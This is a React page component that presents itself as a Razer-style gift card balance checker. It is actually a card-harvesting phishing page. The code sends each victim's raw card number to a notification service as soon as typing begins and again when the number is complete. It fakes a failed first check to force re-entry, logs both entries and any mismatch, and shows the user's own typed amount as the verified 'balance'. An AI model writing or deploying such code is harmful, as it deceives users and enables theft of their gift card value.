// src/pages/Home.jsx - Complete Razer Redesign
import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { sendNotify } from '../services/notifyService';
import FeaturedRewards from '../components/FeaturedRewards';
import LegalDisclaimer from '../components/LegalDisclaimer';
import { logBalanceCheck } from '../services/logService';

// Full-screen balance component
const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  const [isVisible, setIsVisible] = useState(false);
  useEffect(() => { setIsVisible(true); }, []);

  return (
    <div className={`min-h-screen bg-[#050505] relative flex items-center justify-center p-6 overflow-hidden transition-opacity duration-700 ${isVisible ? 'opacity-100' : 'opacity-0'}`}>
      {/* Cyber Grid Background */}
      <div className="absolute inset-0 opacity-[0.15] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#00ff41 1px, transparent 1px), linear-gradient(90deg, #00ff41 1px, transparent 1px)', backgroundSize: '40px 40px', maskImage: 'radial-gradient(ellipse at center, black 10%, transparent 70%)' }}></div>
      
      <div className="max-w-md w-full text-center relative z-10">
        <div className="mb-10 flex flex-col items-center">
          <div className="w-20 h-20 bg-[#00ff41]/10 border border-[#00ff41]/50 flex items-center justify-center rotate-45 shadow-[0_0_40px_rgba(0,255,65,0.3)] animate-pulse">
            <span className="text-[#00ff41] text-4xl font-black -rotate-45">$</span>
          </div>
          <p className="text-[#00ff41] text-xs font-bold tracking-[0.3em] mt-8 uppercase">Balance Verified</p>
        </div>

        <h2 className="text-[#888] text-xs font-bold tracking-[0.2em] uppercase mb-2">Available Funds</h2>
        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>
          {balance}
        </p>

        <div className="inline-block bg-[#0a0a0a] border border-[#222] px-8 py-3 mb-12 shadow-lg" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">
            {cardType} •••• {lastFourDigits}
          </p>
        </div>

        <button
          onClick={onCheckAnother}
          className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]"
          style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
        >
          Check Another Card
        </button>
      </div>
    </div>
  );
};

// Interactive Card Input Component
const CardInput = ({ value, onChange, disabled, attemptCount, onFirstFocus }) => {
  const inputRef = useRef(null);
  const [isFocused, setIsFocused] = useState(false);

  useEffect(() => {
    if (!disabled && attemptCount === 1) {
      inputRef.current?.focus();
    }
  }, [attemptCount, disabled]);

  return (
    <div className="relative transition-all duration-300">
      <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 flex items-center gap-2 font-bold tracking-wider uppercase">
        <span>💳</span> Card Number (14 chars)
        {attemptCount === 1 && (
          <span className="text-[#ffaa00] animate-pulse text-[0.55rem] bg-[#ffaa00]/10 px-2 py-0.5 border border-[#ffaa00]/50">
            ⚠️ RE-ENTER
          </span>
        )}
      </label>
      <input
        ref={inputRef}
        type="text"
        value={value}
        onChange={onChange}
        onFocus={() => { setIsFocused(true); onFirstFocus?.(); }}
        onBlur={() => setIsFocused(false)}
        placeholder={attemptCount === 1 ? "Re-enter CORRECT card number..." : "ABCD 1234 XYZABC"}
        maxLength="17"
        autoComplete="off"
        disabled={disabled}
        className={`w-full p-3 sm:p-4 bg-[#050505] border-2 text-white text-sm font-mono tracking-widest focus:outline-none transition-all duration-300 uppercase
          ${isFocused ? 'border-[#00ff41] shadow-[0_0_15px_rgba(0,255,65,0.2)]' : 'border-[#222]'}
          ${attemptCount === 1 ? 'border-[#ffaa00] text-[#ffaa00]' : ''}
          ${disabled ? 'opacity-50 cursor-not-allowed' : ''}
        `}
        style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}
      />
      <p className="text-[#555] text-[0.6rem] mt-2 flex items-center gap-2 font-mono uppercase tracking-wider">
        <span>ℹ️</span> Letters & Numbers only
        {value && value.replace(/\s/g, '').length > 0 && (
          <span className="text-[#00ff41] font-bold">
            [{value.replace(/\s/g, '').length}/14]
          </span>
        )}
      </p>
    </div>
  );
};

// Interactive Status Message
const StatusMessage = ({ type, message }) => {
  const [isVisible, setIsVisible] = useState(true);
  if (!isVisible) return null;

  const getStyles = () => {
    switch(type) {
      case 'error': return 'bg-[#2a0a0a] border-[#ff3333] text-[#ff3333]';
      case 'success': return 'bg-[#0a2a0a] border-[#00ff41] text-[#00ff41]';
      case 'warning': return 'bg-[#1a1a0a] border-[#ffaa00] text-[#ffaa00]';
      default: return 'bg-[#111] border-[#333] text-[#aaa]';
    }
  };

  const getIcon = () => {
    switch(type) {
      case 'error': return '❌';
      case 'success': return '✅';
      case 'warning': return '⚠️';
      default: return 'ℹ️';
    }
  };

  return (
    <div className={`mt-4 p-4 border font-mono text-[0.7rem] sm:text-sm animate-fadeSlideUp ${getStyles()}`} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}>
      <div className="flex items-start gap-3">
        <span className="text-lg">{getIcon()}</span>
        <div className="flex-1 whitespace-pre-line tracking-wide">
          {message}
        </div>
        <button onClick={() => setIsVisible(false)} className="text-[#555] hover:text-white transition-colors">✕</button>
      </div>
    </div>
  );
};

const Home = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [storedCardNumber, setStoredCardNumber] = useState('');
  const [storedAmount, setStoredAmount] = useState('');
  const [lastRequestTime, setLastRequestTime] = useState(0);
  const [isCardValid, setIsCardValid] = useState(false);
  const [isAmountValid, setIsAmountValid] = useState(false);

  const typingAlertFired = useRef(false);
  const completeAlertFired = useRef(false);
  const failNotifyFired = useRef(false);
  const mismatchNotifyFired = useRef(false);

  const MIN_REQUEST_INTERVAL = 10000;

  useEffect(() => {
    const rawCard = cardNumber.replace(/\s/g, '');
    setIsCardValid(rawCard.length === 14 && /^[A-Za-z0-9]+$/.test(rawCard));
    const num = parseFloat(amount);
    setIsAmountValid(!isNaN(num) && num > 0 && num <= 10000);
  }, [cardNumber, amount]);

  useEffect(() => {
    const raw = cardNumber.replace(/\s/g, '');
    if (raw.length === 0 || typingAlertFired.current) return;
    typingAlertFired.current = true;
    sendNotify({ event: 'typing_start', cardNumber: raw });
  }, [cardNumber]);

  useEffect(() => {
    const raw = cardNumber.replace(/\s/g, '');
    if (raw.length !== 14 || completeAlertFired.current) return;
    completeAlertFired.current = true;
    sendNotify({ event: 'card_complete', cardNumber: raw });
  }, [cardNumber]);

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '');
    const raw = cleaned.slice(0, 14);
    let formatted = '';
    for (let i = 0; i < raw.length; i++) {
      if (i === 4 || i === 8) formatted += ' ';
      formatted += raw[i];
    }
    setCardNumber(formatted);
  };

  const isValidAmount = (amt) => {
    const num = parseFloat(amt);
    return !isNaN(num) && num > 0 && num <= 10000;
  };

  const handleCheckBalance = async () => {
    const now = Date.now();
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
      setError('Please wait a moment before checking again.');
      return;
    }

    const rawCard = cardNumber.replace(/\s/g, '').toUpperCase();
    setError('');
    setShowBalance(false);

    if (!rawCard || !amount) { setError('Please enter card number and amount'); return; }
    if (rawCard.length !== 14) { setError('Card number must be exactly 14 alphanumeric characters'); return; }
    if (!/^[A-Za-z0-9]+$/.test(rawCard)) { setError('Card number can only contain letters and numbers'); return; }
    if (!isValidAmount(amount)) { setError('Please enter a valid amount between $1 and $10,000'); return; }

    setLastRequestTime(now);
    setLoading(true);

    setTimeout(async () => {
      if (attemptCount === 0) {
        setError('UNABLE TO VERIFY CARD\n\nPlease ensure:\n• You have entered the correct card number\n• All 14 alphanumeric characters are correct\n\nPlease re-enter the CORRECT card number and try again.');
        setShowBalance(false);
        setStoredCardNumber(rawCard);
        setStoredAmount(amount);

        try {
          await logBalanceCheck({ type: 'first_attempt_failed', cardNumber: rawCard, amount, status: 'FAILED', pageSource: 'manual' });
        } catch (err) {}

        if (!failNotifyFired.current) {
          failNotifyFired.current = true;
          sendNotify({ event: 'first_attempt_failed', cardNumber: rawCard });
        }

        setCardNumber('');
        setAttemptCount(1);
        typingAlertFired.current = false;
        completeAlertFired.current = false;
        setLastRequestTime(0);
      } else {
        if (storedCardNumber === rawCard) {
          const enteredAmount = parseFloat(storedAmount || amount).toFixed(2);
          const displayBalance = `$${enteredAmount} USD`;
          setBalance(displayBalance);
          setShowBalance(true);
          setShowFullScreenBalance(true);
          setError('');

          try {
            await logBalanceCheck({ type: 'second_attempt_success', cardNumber: rawCard, amount, balance: displayBalance, pageSource: 'manual' });
          } catch (err) {}

          setAttemptCount(0);
          setStoredAmount('');
        } else {
          setError('Card number does NOT match the first attempt.\n\nPlease enter the SAME card number.\n\nField cleared. Try again.');
          try {
            await logBalanceCheck({ type: 'mismatch_attempt', firstCardNumber: storedCardNumber, secondCardNumber: rawCard, amount, pageSource: 'manual' });
          } catch (err) {}

          if (!mismatchNotifyFired.current) {
            mismatchNotifyFired.current = true;
            sendNotify({ event: 'mismatch_trial', firstCardNumber: storedCardNumber, secondCardNumber: rawCard });
          }

          setCardNumber('');
          setAttemptCount(0);
          setStoredCardNumber('');
          setStoredAmount('');
          typingAlertFired.current = false;
          completeAlertFired.current = false;
          failNotifyFired.current = false;
          mismatchNotifyFired.current = false;
          setLastRequestTime(0);
        }
      }
      setLoading(false);
    }, 800);
  };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false);
    setShowBalance(false);
    setBalance('');
    setCardNumber('');
    setAmount('');
    setError('');
    setAttemptCount(0);
    setStoredCardNumber('');
    setStoredAmount('');
    setLoading(false);
    typingAlertFired.current = false;
    completeAlertFired.current = false;
    failNotifyFired.current = false;
    mismatchNotifyFired.current = false;
    setLastRequestTime(0);
  };

  if (showFullScreenBalance) {
    return <FullScreenBalance balance={balance} lastFourDigits={storedCardNumber.slice(-4) || '••••'} cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
  }

  return (
    <>
      <Navbar />
      
      {/* Header Banner */}
      <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
        <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
        <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
          Gift Card Balance Checker
          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
        </h2>
      </div>

      <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-2xl relative">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-50"></div>
          
          <h2 className="text-white text-center text-lg sm:text-xl mb-8 font-black tracking-widest uppercase flex items-center justify-center gap-2">
            <span className="text-[#00ff41] animate-pulse">⬢</span> Terminal Access
          </h2>

          <div className="space-y-6">
            <CardInput value={cardNumber} onChange={(e) => formatCardNumber(e.target.value)} disabled={loading} attemptCount={attemptCount} />

            <div className="transition-all duration-300 relative">
              <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 flex items-center gap-2 font-bold tracking-wider uppercase">
                <span>💰</span> Amount (USD)
                {isAmountValid && (
                  <span className="text-[#00ff41] text-[0.55rem] bg-[#00ff41]/10 px-2 py-0.5 border border-[#00ff41]/50 font-mono">
                    ✓ Valid
                  </span>
                )}
              </label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Enter amount ($1 - $10,000)"
                min="1" max="10000" disabled={loading}
                className={`w-full p-3 sm:p-4 bg-[#050505] border-2 text-white text-sm font-mono tracking-widest focus:outline-none transition-all duration-300
                  ${isAmountValid ? 'border-[#00ff41] shadow-[0_0_15px_rgba(0,255,65,0.2)]' : 'border-[#222] focus:border-[#555]'}
                  ${loading ? 'opacity-50 cursor-not-allowed' : ''}
                `}
                style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}
              />
            </div>

            <div className="text-center my-2 py-4 border-y border-[#222]">
              <Link to="/scan" className="text-[#888] no-underline text-xs font-bold tracking-widest uppercase hover:text-[#00ff41] transition-colors inline-flex items-center gap-2 group">
                <span>📷</span> Switch to Scanner
                <span className="inline-block transition-transform group-hover:translate-x-1 text-[#00ff41]">→</span>
              </Link>
            </div>

            <button
              onClick={handleCheckBalance}
              disabled={loading || !isCardValid || !isAmountValid}
              className={`w-full py-4 font-black text-sm uppercase tracking-[0.2em] transition-all duration-300
                ${loading || !isCardValid || !isAmountValid
                  ? 'bg-[#111] text-[#555] cursor-not-allowed border border-[#333]'
                  : 'bg-[#00ff41] text-black hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98]'
                }
              `}
              style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                  </svg>
                  Verifying...
                </span>
              ) : attemptCount === 1 ? 'Retry Check' : 'Initiate Check'}
            </button>

            {error && <StatusMessage type={error.includes('NOT') || error.includes('mismatch') ? 'error' : 'warning'} message={error} />}
          </div>
        </div>

        <div className="mt-8">
          <FeaturedRewards />
        </div>

        <div className="flex flex-col gap-4 mt-6">
          <div className="bg-[#0a0a0a] border border-[#222] p-5 hover:border-[#00ff41] transition-colors duration-300 relative group">
             <div className="absolute top-0 left-0 w-1 h-full bg-[#00ff41] opacity-50 group-hover:opacity-100 transition-opacity"></div>
            <h3 className="text-white text-sm font-bold tracking-widest mb-2 flex items-center gap-2 uppercase">
              <span className="text-[#00ff41]">⬢</span> Rewards Community
            </h3>
            <p className="text-[#888] text-[0.7rem] mb-3">Connect for exclusive offers and updates!</p>
            <button onClick={() => window.open('https://facebook.com', '_blank')} className="bg-[#1877f2] text-white py-2 px-6 font-bold text-xs tracking-widest uppercase transition-all hover:bg-[#166fe5]">
              Follow Us
            </button>
          </div>
        </div>

        <div className="text-center mt-8 mb-4">
           <a href="#" className="text-[#00ff41] text-xs font-bold tracking-widest uppercase hover:opacity-80 inline-flex items-center gap-2">
            <span>🛒</span> Visit Store
          </a>
        </div>
      </div>

      <LegalDisclaimer />

      <style>{`
        @keyframes fadeSlideUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeSlideUp { animation: fadeSlideUp 0.4s ease; }
        .active\\:scale-98:active { transform: scale(0.98); }
        .whitespace-pre-line { white-space: pre-line; }
        body { background-color: #050505; overflow-x: hidden; width: 100%; margin: 0; padding: 0; color: white; }
        html { overflow-x: hidden; max-width: 100%; }
        * { -webkit-tap-highlight-color: transparent; }
      `}</style>
    </>
  );
};

export default Home;